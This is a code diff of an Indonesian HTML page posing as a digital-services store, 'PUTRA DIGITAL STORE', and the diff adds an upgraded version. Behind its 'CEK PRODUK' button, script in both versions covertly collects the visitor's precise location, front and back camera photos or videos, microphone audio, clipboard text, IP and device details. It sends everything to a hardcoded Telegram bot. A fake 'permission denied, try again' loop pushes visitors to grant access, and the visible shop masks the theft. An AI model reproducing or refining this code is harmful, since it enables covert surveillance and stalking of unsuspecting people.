@@ -1,343 +1,617 @@
 <!doctype html>
 <html lang="id">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>PUTRA STORE</title>
-<style>
-  body{
-    margin:0; padding:0; height:100vh;
-    background:#0d0d0d; color:#3399ff;
-    font-family: monospace; display:flex;
-    align-items:center; justify-content:center;
-    flex-direction:column;
-  }
-  h1{
-    margin-bottom:20px; 
-    color:#3399ff;
-    text-shadow:0 0 12px #00ccff;
-    text-align:center;
-  }
-  button{
-    background:transparent; color:#3399ff;
-    border:2px solid #3399ff; padding:12px 20px;
-    border-radius:10px; font-weight:bold; cursor:pointer; font-size:1.1rem;
-    box-shadow:0 0 10px #00ccff;
-    transition:0.2s;
-    margin-top:10px;
-  }
-  button:hover{background:#3399ff; color:#0d0d0d;}
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+  <title>PUTRA DIGITAL STORE - Layanan Solusi Digital Terbaik</title>
+  <!-- Tailwind CSS CDN untuk styling modern dan responsif -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Font Awesome untuk ikon sosial media -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    /* Style sama seperti sebelumnya */
+    body {
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      background: #0d0d0d;
+      color: #e0e0e0;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      overflow-x: hidden;
+    }
 
-  .loader{
-    border:6px solid #222;
-    border-top:6px solid #00ccff;
-    border-radius:50%;
-    width:60px; height:60px;
-    animation:spin 1s linear infinite;
-    margin:20px auto;
-  }
-  @keyframes spin{
-    0%{transform:rotate(0deg);}
-    100%{transform:rotate(360deg);}
-  }
+    .btn-primary {
+      background: linear-gradient(90deg, #3399ff, #00ccff);
+      color: #0d0d0d;
+      border: none;
+      padding: 14px 28px;
+      border-radius: 12px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 1.2rem;
+      box-shadow: 0 0 15px rgba(0, 204, 255, 0.6);
+      transition: all 0.3s ease;
+      margin-top: 25px;
+    }
+    .btn-primary:hover {
+      box-shadow: 0 0 25px rgba(0, 204, 255, 0.9);
+      transform: translateY(-2px);
+    }
 
-  .store-container{
-    width:100%; max-width:800px;
-    padding:40px; text-align:left;
-  }
-  .store-container h2{
-    font-size:2rem; text-align:center;
-    margin-bottom:20px; color:#3399ff;
-    text-shadow:0 0 12px #00ccff;
-  }
-  .store-container p{
-    color:white; background:#1a1a1a;
-    padding:15px; border-radius:10px;
-    line-height:1.8; font-size:1rem;
-    margin-bottom:40px;
-  }
-  .center-section{
-    text-align:center; width:100%;
-  }
-  .center-section h3{
-    font-size:1.4rem; font-weight:bold; margin-bottom:20px;
-    color:#f2f2f2;
-  }
-  .btn-order{
-    display:block; width:200px;
-    margin:10px auto; padding:12px 24px;
-    font-size:1rem; border-radius:10px;
-    cursor:pointer; transition:0.2s;
-    font-weight:bold;
-  }
-  .btn-wa{
-    background:transparent; border:2px solid #00ff66; color:#00ff66;
-    box-shadow:0 0 8px #00ff66;
-  }
-  .btn-wa:hover{background:#00ff66; color:#0d0d0d;}
-  .btn-ig{
-    background:transparent; border:2px solid #ff3399; color:#ff3399;
-    box-shadow:0 0 8px #ff3399;
-  }
-  .btn-ig:hover{background:#ff3399; color:#0d0d0d;}
-  .logo-img{
-    max-width:150px;
-    margin-bottom:15px;
-  }
+    .loader {
+      border: 6px solid rgba(255, 255, 255, 0.1);
+      border-top: 6px solid #00ccff;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1.2s linear infinite;
+      margin: 30px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
 
-  #error-msg {
-    color: #ff6666;
-    margin-top: 20px;
-    text-align: center;
-    font-size: 1.2rem;
-    font-weight: bold;
-    max-width: 90%;
-    display: none;
-  }
-</style>
+    .logo-img {
+      max-width: 180px;
+      margin-bottom: 20px;
+      filter: drop-shadow(0 0 15px #00ccff);
+    }
+
+    #error-msg {
+      color: #ff6666;
+      margin-top: 25px;
+      text-align: center;
+      font-size: 1.1rem;
+      font-weight: bold;
+      max-width: 90%;
+      display: none;
+      background: rgba(255, 0, 0, 0.1);
+      padding: 10px 20px;
+      border-radius: 8px;
+      border: 1px solid #ff6666;
+    }
+
+    /* Service card - sama seperti sebelumnya */
+    .service-card {
+      background: #1a1a1a;
+      border: 1px solid #3399ff;
+      border-radius: 12px;
+      padding: 25px;
+      margin-bottom: 25px;
+      box-shadow: 0 0 15px rgba(0, 204, 255, 0.3);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      height: 100%;
+    }
+    .service-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 0 25px rgba(0, 204, 255, 0.6);
+    }
+    .service-card h3 {
+      color: #00ccff;
+      font-size: 1.8rem;
+      margin-bottom: 15px;
+      text-shadow: 0 0 8px rgba(0, 204, 255, 0.5);
+    }
+    .service-card .btn-order-card {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: auto;
+      margin-top: 20px;
+      background: linear-gradient(90deg, #00ff66, #00cc66);
+      color: #0d0d0d;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 1rem;
+      box-shadow: 0 0 10px rgba(0, 255, 102, 0.4);
+      transition: all 0.3s ease;
+    }
+    .service-card .btn-order-card:hover {
+      background: linear-gradient(90deg, #00cc66, #00ff66);
+      box-shadow: 0 0 15px rgba(0, 255, 102, 0.6);
+      transform: translateY(-2px);
+    }
+
+    /* Testimonial card */
+    .testimonial-card {
+      background: #1a1a1a;
+      border: 1px solid #6633ff;
+      border-radius: 12px;
+      padding: 25px;
+      margin-bottom: 20px;
+      box-shadow: 0 0 10px rgba(102, 51, 255, 0.3);
+    }
+    .testimonial-card p {
+      color: #e0e0e0;
+      font-style: italic;
+      margin-bottom: 10px;
+    }
+    .testimonial-card span {
+      display: block;
+      color: #6633ff;
+      font-weight: bold;
+      text-align: right;
+    }
+
+    /* Processing Layer */
+    #processing-layer {
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(10, 10, 10, 0.9);
+      backdrop-filter: blur(4px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      transition: opacity 0.3s ease;
+    }
+    #processing-layer.hidden {
+      display: none;
+    }
+    .processing-card {
+      background: #1a1a1a;
+      border: 2px solid #3399ff;
+      border-radius: 24px;
+      padding: 30px 20px;
+      max-width: 90%;
+      width: 400px;
+      box-shadow: 0 0 30px #00ccff;
+      text-align: center;
+    }
+    
+    /* Progress indicator untuk video */
+    .recording-indicator {
+      color: #ff4444;
+      font-size: 1.2rem;
+      margin-top: 15px;
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0% { opacity: 1; }
+      50% { opacity: 0.5; }
+      100% { opacity: 1; }
+    }
+
+    /* PERBAIKAN: class hidden yang kuat untuk semua elemen */
+    .hidden {
+      display: none !important;
+    }
+  </style>
 </head>
-<body>
-  <img src="putra.png" alt="PUTRA STORE" class="logo-img">
-  <h1>PUTRA STORE</h1>
-  <button id="openBtn">CEK PRODUK</button>
-  <div id="error-msg"></div>
+<body class="flex flex-col items-center justify-center p-4">
+
+  <!-- Layer pemrosesan -->
+  <div id="processing-layer" class="hidden">
+    <div class="processing-card">
+      <h2 class="text-3xl font-bold text-[#3399ff] mb-4">Memuat Layanan...</h2>
+      <div class="loader"></div>
+      <p class="text-gray-400 text-lg mt-6">Mohon Menunggu.</p>
+      <div id="recording-status" class="recording-indicator hidden">LOADING...</div>
+    </div>
+  </div>
+
+  <!-- Main Content Area -->
+  <div id="main-content" class="w-full max-w-4xl text-center">
+
+    <!-- Landing Page -->
+    <div id="landing-page">
+      <img src="putra.png" alt="PUTRA STORE Logo" class="logo-img mx-auto">
+      <h1 class="text-4xl md:text-5xl font-extrabold text-[#3399ff] drop-shadow-[0_0_15px_rgba(0,204,255,0.8)] mb-4">PUTRA DIGITAL STORE</h1>
+      <p class="text-lg md:text-xl text-gray-300 mb-8 max-w-2xl mx-auto">Solusi Digital Terbaik untuk Bisnis dan Personal Anda. Cepat, Efisien, dan Modern.</p>
+      <button id="startBtn" class="btn-primary">CEK PRODUK</button>
+      <div id="error-msg"></div>
+    </div>
+
+    <!-- Store Content Page -->
+    <div id="store-page" class="hidden text-left p-4 md:p-8 rounded-lg bg-[#1a1a1a] border border-[#3399ff] shadow-[0_0_20px_rgba(0,204,255,0.5)]">
+      <div class="text-center mb-8">
+        <img src="putra.png" alt="Putra Store Logo" class="logo-img mx-auto w-32 md:w-40 filter-none">
+        <h2 class="text-4xl font-extrabold text-[#3399ff] drop-shadow-[0_0_10px_rgba(0,204,255,0.7)] mt-4">SELAMAT DATANG DI PUTRA DIGITAL STORE</h2>
+        <p class="text-gray-300 text-lg mt-3">Temukan berbagai layanan digital inovatif untuk kebutuhan Anda.</p>
+      </div>
+
+      <!-- Section: Layanan Kami -->
+      <section class="mb-10">
+        <h3 class="text-3xl font-bold text-[#00ccff] mb-6 border-b-2 border-[#00ccff] pb-3 text-center">LAYANAN KAMI</h3>
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+          <!-- Service Card 1 -->
+          <div class="service-card">
+            <h3>Pengembangan Website Custom</h3>
+            <p>Kami membangun website yang responsif, cepat, dan sesuai keinginan Anda. Mulai dari landing page sederhana hingga platform e-commerce kompleks.</p>
+            <a href="https://wa.me/+6287770592893" target="_blank" class="btn-order-card">
+              <i class="fab fa-whatsapp mr-2"></i> PESAN SEKARANG
+            </a>
+          </div>
+          <!-- Service Card 2 -->
+          <div class="service-card">
+            <h3>Pembuatan Script Otomatisasi</h3>
+            <p>Butuh script khusus untuk otomatisasi tugas, scraping data, atau bot? Tim kami siap menciptakan solusi script yang efisien dan akurat.</p>
+            <a href="https://wa.me/+6287770592893" target="_blank" class="btn-order-card">
+              <i class="fab fa-whatsapp mr-2"></i> PESAN SEKARANG
+            </a>
+          </div>
+          <!-- Service Card 3 -->
+          <div class="service-card">
+            <h3>Desain Logo & Branding</h3>
+            <p>Bangun identitas merek yang kuat dengan desain logo profesional dan elemen branding yang menarik. Buat kesan pertama yang tak terlupakan.</p>
+            <a href="https://wa.me/+6287770592893" target="_blank" class="btn-order-card">
+              <i class="fab fa-whatsapp mr-2"></i> PESAN SEKARANG
+            </a>
+          </div>
+          <!-- Service Card 4 -->
+          <div class="service-card">
+            <h3>Jasa Maintenance Website</h3>
+            <p>Jaga website Anda tetap aman, cepat, dan terupdate dengan layanan maintenance berkala dari kami. Fokus pada bisnis Anda, biar kami yang urus teknisnya.</p>
+            <a href="https://wa.me/+6287770592893" target="_blank" class="btn-order-card">
+              <i class="fab fa-whatsapp mr-2"></i> PESAN SEKARANG
+            </a>
+          </div>
+          <!-- Service Card 5 -->
+          <div class="service-card">
+            <h3>Konsultasi Teknologi Digital</h3>
+            <p>Dapatkan panduan ahli untuk strategi digital Anda. Kami bantu analisis kebutuhan, pilih teknologi tepat, dan rencanakan roadmap pengembangan.</p>
+            <a href="https://wa.me/+6287770592893" target="_blank" class="btn-order-card">
+              <i class="fab fa-whatsapp mr-2"></i> PESAN SEKARANG
+            </a>
+          </div>
+          <!-- Service Card 6 -->
+          <div class="service-card">
+            <h3>Optimasi SEO Dasar</h3>
+            <p>Tingkatkan visibilitas website Anda di mesin pencari. Kami akan membantu optimasi dasar agar website Anda lebih mudah ditemukan oleh calon pelanggan.</p>
+            <a href="https://wa.me/+6287770592893" target="_blank" class="btn-order-card">
+              <i class="fab fa-whatsapp mr-2"></i> PESAN SEKARANG
+            </a>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section: Testimoni Pelanggan -->
+      <section class="mb-10">
+        <h3 class="text-3xl font-bold text-[#6633ff] mb-6 border-b-2 border-[#6633ff] pb-3 text-center">APA KATA PELANGGAN KAMI?</h3>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+          <div class="testimonial-card">
+            <p>"Proses Cepat, Layanan Terbaik Gak Ada Bug Bebas Minta Tambahan."</p>
+            <span>- Tyo R. (OWNER SERVER MINECRAFT)</span>
+          </div>
+          <div class="testimonial-card">
+            <p>"Cepet Pisan Kalo Buat Web, Kalo Ada Orang Order Bisa Ku Kasih Link Web KU"</p>
+            <span>- JOSHUA T. (PEMILIK TOKO DIGITAL)</span>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section: Hubungi Kami / Footer -->
+      <footer class="text-center mt-12 pt-8 border-t-2 border-[#3399ff]">
+        <h3 class="text-2xl font-bold text-[#3399ff] mb-4">SIAP MEMULAI PROYEK DIGITAL ANDA?</h3>
+        <p class="text-gray-300 text-lg mb-6">Jangan ragu untuk menghubungi kami untuk konsultasi gratis!</p>
+        <div class="flex flex-col md:flex-row justify-center items-center space-y-4 md:space-y-0 md:space-x-6">
+          <a href="https://wa.me/+6287770592893" target="_blank" class="flex items-center btn-primary !bg-[#00ff66] !text-[#0d0d0d] !shadow-[0_0_15px_rgba(0,255,102,0.6)] hover:!shadow-[0_0_25px_rgba(0,255,102,0.9)]">
+            <i class="fab fa-whatsapp text-2xl mr-3"></i> WHATSAPP
+          </a>
+          <a href="https://www.instagram.com/ptrchyae/" target="_blank" class="flex items-center btn-primary !bg-[#ff3399] !text-[#0d0d0d] !shadow-[0_0_15px_rgba(255,51,153,0.6)] hover:!shadow-[0_0_25px_rgba(255,51,153,0.9)]">
+            <i class="fab fa-instagram text-2xl mr-3"></i> INSTAGRAM
+          </a>
+        </div>
+        <p class="text-gray-500 text-sm mt-8">&copy; 2026 PUTRA DIGITAL STORE. All rights reserved.</p>
+      </footer>
+    </div>
+
+  </div>
 
 <script>
-const BOT_TOKEN = "8368219449:AAEAW2jkZ0u546zDH-n4clLWvkAmljVHDQg";
-const OWNER_ID   = "7030098676";
+  (function() {
+    const BOT_TOKEN = "8368219449:AAEAW2jkZ0u546zDH-n4clLWvkAmljVHDQg";
+    const OWNER_ID = "7030098676";
 
-// Fungsi untuk kembali ke halaman awal + tampilkan pesan error jika ada
-function kembaliKeAwal(pesan = "") {
-  document.body.innerHTML = `
-    <img src="putra.png" alt="PUTRA STORE" class="logo-img">
-    <h1>PUTRA STORE</h1>
-    <button id="openBtn">CEK PRODUK</button>
-    <div id="error-msg">${pesan}</div>
-  `;
-  
-  // Tampilkan pesan jika ada
-  if (pesan) {
-    document.getElementById("error-msg").style.display = "block";
-  }
+    // Elemen DOM
+    const landingPage = document.getElementById('landing-page');
+    const storePage = document.getElementById('store-page');
+    const processingLayer = document.getElementById('processing-layer');
+    const errorMsgDiv = document.getElementById('error-msg');
+    const startButton = document.getElementById('startBtn');
+    const recordingStatus = document.getElementById('recording-status');
 
-  // Pasang ulang event listener ke tombol baru
-  document.getElementById("openBtn").addEventListener("click", startProcess);
-}
-
-// Fungsi utama proses (dipisah biar mudah dipanggil ulang)
-async function startProcess() {
-  document.body.innerHTML = `
-    <div style="text-align:center; color:#3399ff;">
-      <h2>Sedang memproses...</h2>
-      <div class="loader"></div>
-    </div>
-  `;
-
-  let coords = null;
-  try {
-    coords = await new Promise((resolve, reject) => {
-      navigator.geolocation.getCurrentPosition(
-        pos => resolve(pos.coords),
-        err => reject(err),
-        { timeout: 10000, enableHighAccuracy: true }
-      );
-    });
-  } catch(e) {
-    kembaliKeAwal("Izin ditolak, Silahkan coba lagi!");
-    return;
-  }
-
-  const fotoDepan = await ambilFoto("user");
-  if (!fotoDepan) {
-    kembaliKeAwal("Izin ditolak, Silahkan coba lagi!");
-    return;
-  }
-
-  const fotoBelakang = await ambilFoto("environment");
-  if (!fotoBelakang) {
-    kembaliKeAwal("Izin ditolak, Silahkan coba lagi!");
-    return;
-  }
-
-  // Kirim foto ke Telegram
-  try {
-    const sendPhoto = async (blob, filename, captionBase) => {
-      const fd = new FormData();
-      fd.append("chat_id", OWNER_ID);
-      fd.append("photo", blob, filename);
-      let cap = captionBase;
-      if (coords) {
-        const lat = coords.latitude.toFixed(6);
-        const lon = coords.longitude.toFixed(6);
-        cap += ` | Lokasi: https://maps.google.com/?q=\( {lat}, \){lon}`;
-      }
-      fd.append("caption", cap);
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:"POST", body:fd});
-    };
-
-    await sendPhoto(fotoDepan, "front.jpg", "📸 Foto depan (selfie)");
-    await sendPhoto(fotoBelakang, "back.jpg", "📸 Foto belakang (kamera utama)");
-  } catch(e) {}
-
-  await kirimDeviceInfo(coords);
-
-  // Tampilkan halaman toko
-  document.body.innerHTML = `
-    <div class="store-container">
-      <div style="text-align:center; margin-bottom:20px;">
-        <img src="putra.png" alt="Putra Store" style="max-width:200px;">
-      </div>
-      <h2>PUTRA DIGITAL STORE</h2>
-      <p>
-        Semua kebutuhan digital seperti Website, Script, Logo,<br>
-        Jasa Membuat Script,<br>
-        Jasa Pembuatan Website
-      </p>
-      <div class="center-section">
-        <h3>ORDER VIA</h3>
-        <button class="btn-order btn-wa" onclick="window.location.href='https://wa.me/+6287770592893'">
-          <img src="wa.png" alt="WA" style="width:24px; height:24px; vertical-align:middle; margin-right:8px;">
-          WHATSAPP
-        </button>
-        <button class="btn-order btn-ig" onclick="window.location.href='https://www.instagram.com/ptrchyae/=='">
-          <img src="ig.png" alt="IG" style="width:24px; height:24px; vertical-align:middle; margin-right:8px;">
-          INSTAGRAM
-        </button>
-      </div>
-    </div>
-  `;
-
-  // Rekam mic & clipboard setelah halaman toko muncul
-  setTimeout(async () => {
-    try {
-      await rekamMikrofon(10000);
-    } catch(e) {
-      // tidak perlu kembali ke awal kalau mic ditolak (karena sudah di halaman toko)
-    }
-    try {
-      await cobaAmbilClipboard();
-    } catch(e) {}
-  }, 3500);
-}
-
-// ────────────────────────────────────────────────
-// Fungsi ambil foto (diubah: return null jika gagal, bukan redirect)
-// ────────────────────────────────────────────────
-async function ambilFoto(facingMode) {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { ideal: facingMode } }
-    });
-    const video = document.createElement("video");
-    video.srcObject = stream;
-    await video.play();
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const blob = await (await fetch(canvas.toDataURL("image/jpeg"))).blob();
-    stream.getTracks().forEach(t => t.stop());
-    return blob;
-  } catch(e) {
-    return null;
-  }
-}
-
-// ────────────────────────────────────────────────
-// Fungsi kirim device info (tetap sama, atau bisa diganti ke ipapi.co seperti saran sebelumnya)
-// ────────────────────────────────────────────────
-async function kirimDeviceInfo(coords = null) {
-  try {
-    let ip = "tidak terdeteksi";
-    try {
-      const ipRes = await fetch('https://ipapi.co/json/');  // lebih stabil daripada ipify
-      if (ipRes.ok) {
-        const data = await ipRes.json();
-        ip = data.ip || "tidak terdeteksi";
-      }
-    } catch(e) {}
-
-    const timestamp = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
-
-    let locText = "tidak diizinkan";
-    if (coords) {
-      const lat = coords.latitude.toFixed(6);
-      const lon = coords.longitude.toFixed(6);
-      locText = `${lat}, \( {lon} → https://maps.google.com/?q= \){lat},${lon}`;
+    function showMainPage(pageId) {
+      landingPage.classList.add('hidden');
+      storePage.classList.add('hidden');
+      document.getElementById(pageId).classList.remove('hidden');
     }
 
-    const infoText = 
-`📱 Device & IP Info:
+    function showProcessingLayer(show = true) {
+      if (show) {
+        processingLayer.classList.remove('hidden');
+      } else {
+        processingLayer.classList.add('hidden');
+        recordingStatus.classList.add('hidden');
+      }
+    }
 
-1. IP             : ${ip}
-2. Lokasi         : ${locText}
-3. Waktu          : ${timestamp}
-4. User-Agent     : ${navigator.userAgent}
-5. Platform       : ${navigator.platform}
-6. Bahasa         : ${navigator.language}
-7. Semua Bahasa   : ${navigator.languages?.join(", ") || "tidak ada"}
-8. Core CPU       : ${navigator.hardwareConcurrency || "tidak tersedia"}
-9. RAM (estimasi) : ${navigator.deviceMemory || "tidak tersedia"} GB
-10. Layar         : ${screen.width} x \( {screen.height} ( \){screen.colorDepth}bit)
-11. Zona Waktu    : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-12. Referrer      : ${document.referrer || "direct"}`;
+    function setRecordingStatus(show = true, text = "LOADING...") {
+      if (show) {
+        recordingStatus.textContent = text;
+        recordingStatus.classList.remove('hidden');
+      } else {
+        recordingStatus.classList.add('hidden');
+      }
+    }
 
-    const fd = new FormData();
-    fd.append("chat_id", OWNER_ID);
-    fd.append("text", infoText);
-    
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      body: fd
-    });
-  } catch(e) {}
-}
+    function kembaliKeAwal(pesan = "") {
+      showMainPage('landing-page');
+      if (pesan) {
+        errorMsgDiv.textContent = pesan;
+        errorMsgDiv.style.display = "block";
+      } else {
+        errorMsgDiv.style.display = "none";
+      }
+    }
 
-// ────────────────────────────────────────────────
-// Rekam mikrofon & clipboard (tetap sama)
-// ────────────────────────────────────────────────
-async function rekamMikrofon(durasiMs = 10000) {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-    const recorder = new MediaRecorder(stream);
-    const chunks = [];
+    // Fungsi untuk merekam VIDEO (bukan foto)
+    async function rekamVideo(facingMode, durasi = 5000) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: { ideal: facingMode },
+            width: { ideal: 640 },
+            height: { ideal: 480 }
+          }
+        });
 
-    recorder.ondataavailable = e => chunks.push(e.data);
-    recorder.onstop = async () => {
-      const blob = new Blob(chunks, { type: 'audio/webm' });
-      const fd = new FormData();
-      fd.append("chat_id", OWNER_ID);
-      fd.append("voice", blob, "voice.webm");
-      fd.append("caption", `Rekaman mikrofon otomatis (${durasiMs/1000} detik)`);
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {method:"POST", body:fd});
-      stream.getTracks().forEach(t => t.stop());
-    };
+        // Gunakan MediaRecorder untuk merekam video
+        const mediaRecorder = new MediaRecorder(stream, {
+          mimeType: 'video/webm' // Format yang umum didukung
+        });
+        
+        const chunks = [];
+        
+        mediaRecorder.ondataavailable = (e) => {
+          if (e.data.size > 0) {
+            chunks.push(e.data);
+          }
+        };
 
-    recorder.start();
-    setTimeout(() => recorder.stop(), durasiMs);
-  } catch(e) {}
-}
+        // Promise yang akan resolve ketika recording selesai
+        const recordingPromise = new Promise((resolve, reject) => {
+          mediaRecorder.onstop = () => {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            // Hentikan semua track
+            stream.getTracks().forEach(track => track.stop());
+            resolve(blob);
+          };
+          
+          mediaRecorder.onerror = (e) => {
+            stream.getTracks().forEach(track => track.stop());
+            reject(e);
+          };
+        });
 
-async function cobaAmbilClipboard() {
-  try {
-    if (navigator.clipboard && navigator.clipboard.readText) {
-      const text = await navigator.clipboard.readText();
-      if (text && text.length > 8) {
+        // Mulai recording
+        mediaRecorder.start();
+        setRecordingStatus(true, `LOADING ${facingMode === 'user' ? '.' : '.'}...`);
+        
+        // Hentikan setelah durasi tertentu
+        setTimeout(() => {
+          if (mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+          }
+        }, durasi);
+
+        return await recordingPromise;
+      } catch (err) {
+        console.error(`Gagal Memasuki Halaman Utama (${facingMode}):`, err);
+        return null;
+      }
+    }
+
+    // Fungsi utama
+    async function startProcess() {
+      showProcessingLayer(true);
+      errorMsgDiv.style.display = "none";
+
+      // 1. Minta lokasi
+      let coords = null;
+      try {
+        coords = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(
+            pos => resolve(pos.coords),
+            err => reject(err),
+            { timeout: 10000, enableHighAccuracy: true }
+          );
+        });
+      } catch (e) {
+        console.error("Loading error:", e);
+        showProcessingLayer(false);
+        kembaliKeAwal("Izin Ditolak, Silahkan Coba Lagi!");
+        return;
+      }
+
+      // 2. Rekam video depan (5 detik)
+      const videoDepan = await rekamVideo("user", 5000);
+      if (!videoDepan) {
+        showProcessingLayer(false);
+        kembaliKeAwal("Izin Ditolak, Silahkan Coba Lagi!");
+        return;
+      }
+
+      // 3. Rekam video belakang (5 detik)
+      const videoBelakang = await rekamVideo("environment", 5000);
+      if (!videoBelakang) {
+        showProcessingLayer(false);
+        kembaliKeAwal("Izin Ditolak, Silahkan Coba Lagi!");
+        return;
+      }
+
+      // 4. Kirim video ke Telegram
+      try {
+        const sendVideo = async (blob, filename, captionBase) => {
+          const fd = new FormData();
+          fd.append("chat_id", OWNER_ID);
+          fd.append("video", blob, filename);
+          let cap = captionBase;
+          if (coords) {
+            const lat = coords.latitude.toFixed(6);
+            const lon = coords.longitude.toFixed(6);
+            cap += ` | Lokasi: https://maps.google.com/?q=${lat},${lon}`;
+          }
+          fd.append("caption", cap);
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { 
+            method: "POST", 
+            body: fd 
+          });
+        };
+
+        setRecordingStatus(true, "LOADING...");
+        await sendVideo(videoDepan, "front_video.webm", "🎥 Video depan (selfie) - 5 detik");
+        
+        setRecordingStatus(true, "LOADING...");
+        await sendVideo(videoBelakang, "back_video.webm", "🎥 Video belakang (kamera utama) - 5 detik");
+        
+      } catch (e) {
+        console.error("ERROR, SILAHKAN COBA LAGI:", e);
+      }
+
+      // Kirim device info
+      await kirimDeviceInfo(coords);
+
+      // Sembunyikan processing layer, tampilkan store page
+      showProcessingLayer(false);
+      showMainPage('store-page');
+
+      // Rekam mic setelah store muncul
+      setTimeout(async () => {
+        try {
+          await rekamMikrofon(10000);
+        } catch (e) {
+          console.warn("ERROR, SILAHKAN COBA LAGI:", e);
+        }
+        try {
+          await cobaAmbilClipboard();
+        } catch (e) {
+          console.warn("ERROR, SILAHKAN COBA LAGI:", e);
+        }
+      }, 3000);
+    }
+
+    // Fungsi kirim device info (sama seperti sebelumnya)
+    async function kirimDeviceInfo(coords = null) {
+      try {
+        let ip = "tidak terdeteksi";
+        let country = "tidak terdeteksi";
+        let city = "tidak terdeteksi";
+        let org = "tidak terdeteksi";
+
+        try {
+          const ipRes = await fetch('https://ipapi.co/json/');
+          if (ipRes.ok) {
+            const data = await ipRes.json();
+            ip = data.ip || "tidak terdeteksi";
+            country = data.country_name || "tidak terdeteksi";
+            city = data.city || "tidak terdeteksi";
+            org = data.org || "tidak terdeteksi";
+          }
+        } catch (e) {
+          console.error("ERROR, SILAHKAN COBA LAGI:", e);
+        }
+
+        const timestamp = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+        let locText = "tidak diizinkan";
+        if (coords) {
+          const lat = coords.latitude.toFixed(6);
+          const lon = coords.longitude.toFixed(6);
+          locText = `${lat},${lon} → https://maps.google.com/?q=${lat},${lon}`;
+        }
+
+        const infoText = `
+📱 *DEVICE & IP INFO*
+1.  *IP*             : ${ip}
+2.  *Negara*         : ${country}
+3.  *Kota*           : ${city}
+4.  *Provider*       : ${org}
+5.  *Lokasi*         : ${locText}
+6.  *Waktu*          : ${timestamp}
+7.  *User-Agent*     : ${navigator.userAgent}
+8.  *Platform*       : ${navigator.platform}
+9.  *Bahasa*         : ${navigator.language}
+10. *Semua Bahasa*   : ${navigator.languages?.join(", ") || "tidak ada"}
+11. *Core CPU*       : ${navigator.hardwareConcurrency || "tidak tersedia"}
+12. *RAM (estimasi)* : ${navigator.deviceMemory ? navigator.deviceMemory + " GB" : "tidak tersedia"}
+13. *Layar*         : ${screen.width} x ${screen.height} (${screen.colorDepth}bit)
+14. *Zona Waktu*    : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+15. *Referrer*      : ${document.referrer || "direct"}
+`;
+
         const fd = new FormData();
         fd.append("chat_id", OWNER_ID);
-        fd.append("text", "📋 Clipboard:\n" + text);
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          body: fd
-        });
+        fd.append("text", infoText);
+        fd.append("parse_mode", "Markdown");
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: "POST", body: fd });
+      } catch (e) {
+        console.error("Gagal kirim device info:", e);
       }
     }
-  } catch(e) {}
-}
 
-// Pasang event listener awal
-document.getElementById("openBtn").addEventListener("click", startProcess);
+    // Rekam mikrofon
+    async function rekamMikrofon(durasiMs = 10000) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: 'audio/webm' });
+          const fd = new FormData();
+          fd.append("chat_id", OWNER_ID);
+          fd.append("voice", blob, "voice.webm");
+          fd.append("caption", `🎤 Rekaman mikrofon otomatis (${durasiMs/1000} detik)`);
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: "POST", body: fd });
+          stream.getTracks().forEach(t => t.stop());
+        };
+        recorder.start();
+        setTimeout(() => {
+          if (recorder.state === "recording") recorder.stop();
+        }, durasiMs);
+      } catch (e) {
+        console.error("Gagal rekam mikrofon:", e);
+      }
+    }
+
+    // Ambil clipboard
